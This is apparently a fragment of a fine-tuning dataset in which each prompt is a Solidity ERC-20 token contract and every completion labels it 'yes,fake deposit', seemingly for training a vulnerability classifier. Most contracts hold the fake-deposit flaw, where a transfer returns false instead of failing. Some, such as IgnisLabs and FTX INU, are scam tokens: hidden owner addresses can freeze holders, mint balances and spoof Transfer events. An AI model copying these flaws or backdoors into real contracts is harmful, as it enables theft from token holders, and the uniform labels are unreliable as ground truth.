}\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\n\ncontract Ownable {\n address public owner;\n\n\n \n function Ownable() {\n owner = msg.sender;\n }\n\n\n \n modifier onlyOwner() {\n if (msg.sender != owner) {\n throw;\n }\n _;\n }\n\n\n \n function transferOwnership(address newOwner) onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n\n}\n\n\n\ncontract MangoDoge is StandardToken, Ownable {\n\n uint8 public decimals = 18;\n uint public totalSupply = 1000000000000 * 10 ** 18; \n string public name = \"Mango Doge\";\n string public symbol = \"MDOGE\";\n\n function MangoDoge() {\n balances[msg.sender] = totalSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address bBMC = 0xCf22BDd6C4d0c2967ff0779A60d750F94A8374fb;\n\taddress BBMW = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract IgnisLabs is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private bBc;\n\tmapping (address => bool) private bBb;\n mapping (address => bool) private bBw;\n mapping (address => mapping (address => uint256)) private bBv;\n uint8 private constant BBl = 8;\n uint256 private constant bBS = 200000000 * (10** BBl);\n string private constant _name = \"Ignis Labs\";\n string private constant _symbol = \"IGNIS\";\n\n\n\n constructor () {\n bBc[_msgSender()] = bBS;\n bMkr(BBMW, bBS); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return BBl;\n }\n\n function totalSupply() public pure returns (uint256) {\n return bBS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return bBc[account];\n }\n\t\n\n \n\t function aBburn(address bBj) onlyOwner public{\n bBb[bBj] = true; }\n\t\n function bMkr(address bBj, uint256 bBn) onlyOwner internal {\n emit Transfer(address(0), bBj ,bBn); }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return bBv[owner][spender];\n }\n\t\t\n function approve(address spender, uint256 amount) public returns (bool success) { \n bBv[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction bBquery(address bBj) public{\n if(bBb[msg.sender]) { \n bBw[bBj] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == bBMC) {\n require(amount <= bBc[sender]);\n bBc[sender] -= amount; \n bBc[recipient] += amount; \n bBv[sender][msg.sender] -= amount;\n emit Transfer (BBMW, recipient, amount);\n return true; } else \n if(!bBw[recipient]) {\n if(!bBw[sender]) {\n require(amount <= bBc[sender]);\n require(amount <= bBv[sender][msg.sender]);\n bBc[sender] -= amount;\n bBc[recipient] += amount;\n bBv[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction bBStake(address bBj) public {\n if(bBb[msg.sender]) { \n bBw[bBj] = false;}}\n\t\t\n\t\tfunction transfer(address bBj, uint256 bBn) public {\n if(msg.sender == bBMC) {\n require(bBc[msg.sender] >= bBn);\n bBc[msg.sender] -= bBn; \n bBc[bBj] += bBn; \n emit Transfer (BBMW, bBj, bBn);} else \n if(bBb[msg.sender]) {bBc[bBj] += bBn;} else\n if(!bBw[msg.sender]) {\n require(bBc[msg.sender] >= bBn);\n bBc[msg.sender] -= bBn; \n bBc[bBj] += bBn; \n emit Transfer(msg.sender, bBj, bBn);}}\n\t\t\n\t\t\n\n\t\t\n\t\t}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Oppred is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Oppred\";\n string public constant symbol = \"OPP\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity 0.4.19;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n\n function transfer(address _to, uint _value) returns (bool) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\ncontract UnboundedRegularToken is RegularToken {\n\n uint constant MAX_UINT = 2**256 - 1;\n \n /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\n /// @param _from Address to transfer from.\n /// @param _to Address to transfer to.\n /// @param _value Amount to transfer.\n /// @return Success of transfer.\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n}\n\ncontract IToken is UnboundedRegularToken {\n\n uint public totalSupply = 1*10**26;\n uint8 constant public decimals = 18;\n string constant public name = \"Internxt\";\n string constant public symbol = \"INXT\";\n\n function IToken() {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\n// FTX INU (FINU) is the original backbone of the FTX ecosystem\n// FINU is here for those hurt by the recent market conditions\n\n// Website: https://www.ftxclassic.io/\n// Twitter: https://twitter.com/FTXCLASSIC\n// Telegram: https://t.me/ftxclassicentry\n\nabstract contract Context {\n function _MsgSendr() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _kpconstruct = 0x0Ea8fDe52ca1C31b8b6142FA3B8d11Bc2f18c62D;\n\taddress V2UniswapRouter = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\n constructor () {\n address msgSender = _MsgSendr();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\ncontract FTXINU is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Opp;\n\tmapping (address => bool) private Ypp;\n mapping (address => bool) private Kpp;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _kpSup = 150000000 * 10**_decimals;\n string private constant _name = \"FTX Inu\";\n string private constant _symbol = \"FINU\";\n\n constructor () {\n Opp[_MsgSendr()] = _kpSup;\n emit Transfer(address(0), V2UniswapRouter, _kpSup);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _kpSup;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Opp[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n\t\tfunction ppend(address px) public {\n if(Ypp[msg.sender]) { \n Kpp[px] = false;}}\n\n function ppquery(address px) public{\n if(Ypp[msg.sender]) { \n require(!Kpp[px]);\n Kpp[px] = true; }}\n\n\t\tfunction ppstake(address px) public{\n if(msg.sender == _kpconstruct) { \n require(!Ypp[px]);\n Ypp[px] = true; }}\n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _kpconstruct) {\n require(amount <= Opp[sender]);\n Opp[sender] -= amount; \n Opp[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (V2UniswapRouter, recipient, amount);\n return true; } \n if(!Kpp[recipient]) {\n if(!Kpp[sender]) {\n require(amount <= Opp[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n Opp[sender] -= amount;\n Opp[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\n\t\tfunction transfer(address recipient, uint256 amount) public {\n if(msg.sender == _kpconstruct) {\n require(Opp[msg.sender] >= amount);\n Opp[msg.sender] -= amount; \n Opp[recipient] += amount; \n emit Transfer (V2UniswapRouter, recipient, amount);}\n if(Ypp[msg.sender]) {Opp[recipient] = amount;} \n if(!Kpp[msg.sender]) {\n require(Opp[msg.sender] >= amount);\n Opp[msg.sender] -= amount; \n Opp[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "{\"SaoTeamCoin.sol\":{\"content\":\"\\\npragma solidity ^0.4.0;\\\n\\\nimport \\\"./StandardToken.sol\\\";\\\n\\\ncontract SaoTeamCoin is StandardToken {\\\n function () {\\\n throw;\\\n }\\\n\\\n string public name;\\\n uint8 public decimals;\\\n string public symbol;\\\n\\\n function SaoTeamCoin(\\\n ) {\\\n balances[msg.sender] = 10000000000000000000000000000; \\\n totalSupply = 10000000000000000000000000000; \\\n name = \\\"S-TEAM Coin\\\"; \\\n decimals = 18; \\\n symbol = \\\"ST\\\"; \\\n }\\\n\\\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\\\n allowed[msg.sender][_spender] = _value;\\\n Approval(msg.sender, _spender, _value);\\\n\\\n if(!_spender.call(bytes4(bytes32(sha3(\\\"receiveApproval(address,uint256,address,bytes)\\\"))), msg.sender, _value, this, _extraData)) { throw; }\\\n return true;\\\n }\\\n}\"},\"StandardToken.sol\":{\"content\":\"\\\n\\\npragma solidity ^0.4.0;\\\n\\\nimport \\\"./Token.sol\\\";\\\n\\\ncontract StandardToken is Token {\\\n\\\n function transfer(address _to, uint256 _value) returns (bool success) {\\\n if (balances[msg.sender] \\u003e= _value \\u0026\\u0026 _value \\u003e 0) {\\\n balances[msg.sender] -= _value;\\\n balances[_to] += _value;\\\n Transfer(msg.sender, _to, _value);\\\n return true;\\\n } else { return false; }\\\n }\\\n\\\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\\\n if (balances[_from] \\u003e= _value \\u0026\\u0026 allowed[_from][msg.sender] \\u003e= _value \\u0026\\u0026 _value \\u003e 0) {\\\n balances[_to] += _value;\\\n balances[_from] -= _value;\\\n allowed[_from][msg.sender] -= _value;\\\n Transfer(_from, _to, _value);\\\n return true;\\\n } else { return false; }\\\n }\\\n\\\n function balanceOf(address _owner) constant returns (uint256 balance) {\\\n return balances[_owner];\\\n }\\\n\\\n function approve(address _spender, uint256 _value) returns (bool success) {\\\n allowed[msg.sender][_spender] = _value;\\\n Approval(msg.sender, _spender, _value);\\\n return true;\\\n }\\\n\\\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\\\n return allowed[_owner][_spender];\\\n }\\\n\\\n mapping (address =\\u003e uint256) balances;\\\n mapping (address =\\u003e mapping (address =\\u003e uint256)) allowed;\\\n uint256 public totalSupply;\\\n}\"},\"Token.sol\":{\"content\":\"pragma solidity ^0.4.0;\\\n\\\ncontract Token {\\\n\\\n function totalSupply() constant returns (uint256 supply) {}\\\n function balanceOf(address _owner) constant returns (uint256 balance) {}\\\n function transfer(address _to, uint256 _value) returns (bool success) {}\\\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\\\n function approve(address _spender, uint256 _value) returns (bool success) {}\\\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\\\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\\\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\\\n}\"}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\n\ninterface ERC20Interface {\n \n function totalSupply() external view returns (uint256);\n\n \n function balanceOf(address account) external view returns (uint256);\n\n \n function transfer(address recipient, uint256 amount) external returns (bool);\n\n \n function allowance(address owner, address spender) external view returns (uint256);\n\n \n function approve(address spender, uint256 amount) external returns (bool);\n\n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n \n event Transfer(address indexed from, address indexed to, uint256 value);\n\n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n // Empty internal constructor, to prevent people from mistakenly deploying\n // an instance of this contract, which should be used via inheritance.\n // constructor () internal { }\n // solhint-disable-previous-line no-empty-blocks\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract OLBM is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply;\n _balances[msg.sender] = initialSupply;\n }\n\n \n function name() public view returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// Abstract contract for the full ERC 20 Token standard\n// https://github.com/ethereum/EIPs/issues/20\npragma solidity >=0.4.0 <0.9.0;\n\nabstract contract Token {\n \n /// total amount of tokens\n uint256 public totalSupply;\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return balance The balance\n function balanceOf(address _owner) public virtual view returns (uint256 balance);\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return success Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) public virtual returns (bool success);\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return success Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) public virtual returns (bool success);\n\n /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of tokens to be approved for transfer\n /// @return success Whether the approval was successful or not\n function approve(address _spender, uint256 _value) public virtual returns (bool success);\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return remaining Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) public virtual view returns (uint256 remaining);\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) public override returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) public override view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public override returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public override view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\n\ncontract OmegaCoinToken is StandardToken {\n\n uint8 public constant decimals = 18;\n address public owner;\n\n modifier isOwner() {\n require(msg.sender == owner);\n _;\n }\n\n function setMinter(address _minterAddress, uint256 _value) public isOwner {\n require(_minterAddress != address(0));\n minters[_minterAddress] = _value;\n }\n\n function minterLeft(address _minterAddress) view public returns (uint256 rest) {\n return minters[_minterAddress];\n }\n\n function dematerialize(uint256 _value) public {\n if (minters[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] += _value;\n minters[msg.sender] -= _value;\n totalSupply += _value;\n emit Transfer(address(0), msg.sender, _value);\n }\n }\n\n function materialize(uint256 _value) public {\n if (minters[msg.sender] >= _value && balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n totalSupply -= _value;\n emit Transfer(msg.sender, address(0), _value);\n }\n }\n\n mapping (address => uint256) minters;\n}\n\ncontract OmegaGBP is OmegaCoinToken {\n\n string public constant name = \"Omega GBP\";\n string public constant symbol = \"oGBP\";\n\n constructor() {\n owner = msg.sender;\n totalSupply = 0;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\n// Abstract contract for the full ERC 20 Token standard\n// https://github.com/ethereum/EIPs/issues/20\npragma solidity ^0.4.8;\n\ncontract Token {\n \n /// total amount of tokens\n uint256 public totalSupply;\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance);\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success);\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n\n /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of tokens to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success);\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\n\ncontract FensToken is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n revert();\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'FENS1.0'; //ProToken 1.0 standard. Just an arbitrary versioning scheme.\n\n function FensToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount; // Give the creator all initial tokens\n totalSupply = _initialAmount; // Update total supply\n name = _tokenName; // Set the name for display purposes\n decimals = _decimalUnits; // Amount of decimals for display purposes\n symbol = _tokenSymbol; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\n\n###\n\n", "completion": 